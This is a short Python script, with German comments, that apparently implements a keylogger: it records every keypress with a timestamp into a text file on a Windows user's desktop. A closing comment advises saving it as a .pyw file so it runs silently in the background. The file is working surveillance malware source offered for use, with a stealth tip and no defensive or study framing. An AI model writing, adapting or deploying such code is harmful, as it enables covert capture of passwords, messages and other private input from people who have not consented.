from pynput.keyboard import Key, Listener
import logging

log_destination = "C:\\Users\OkansPC\Desktop\\"                     #nach dem ordnerpfad zwei backslashes - dateiname und pfad wird zusammengeklebt
log_name = "keylogger.txt"

logging.basicConfig(filename=(log_destination + log_name), level=logging.DEBUG, format='%(asctime)s >> %(message)s')

def on_press(key):
    x = logging.info(key)
with Listener(on_press=on_press) as listener:
    listener.join()

#speicher die datei als .pyw ab dann läuft das python skript silent im hintergrund aber noch im tskmgr sichtbar





